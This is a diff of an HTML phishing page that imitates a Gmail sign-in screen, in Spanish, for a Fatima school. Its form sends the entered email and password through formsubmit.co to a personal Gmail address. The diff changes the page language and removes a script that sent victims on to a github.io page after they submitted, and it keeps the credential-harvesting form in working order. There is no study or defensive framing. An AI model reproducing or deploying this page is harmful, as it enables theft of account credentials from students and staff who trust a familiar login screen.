@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -79,28 +79,18 @@
 </head>
 <body>
 
+  <!-- El formulario ahora se conecta a Formsubmit -->
   <div class="login-container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Gmail_Icon.png" alt="Logo">
     <h1>Iniciar sesión</h1>
-    <form 
-      action="https://formsubmit.co/aldairabel9@gmail.com" 
-      method="POST" 
-      onsubmit="redirectAfterSubmit()">
-      <input type="email" name="email" placeholder="Correo electrónico de la escuela fatima" required>
+    <form action="https://formsubmit.co/aldairabel9@gmail.com" method="POST">
+      <input type="email" name="email" placeholder="Correo electrónico de la escuela Fatima" required>
       <input type="password" name="password" placeholder="Contraseña" required>
       <button type="submit">Iniciar sesión</button>
     </form>
     <div class="forgot-password">¿Olvidaste tu contraseña?</div>
     <div class="create-account">Crear una cuenta</div>
   </div>
-
-  <script>
-    function redirectAfterSubmit() {
-      setTimeout(() => {
-        window.location.href = "https://227700-jdm.github.io/Giovas.github.io/";
-      }, 1000); // 1000 ms = 1 segundo de espera antes de redirigir
-    }
-  </script>
 
 </body>
 </html>
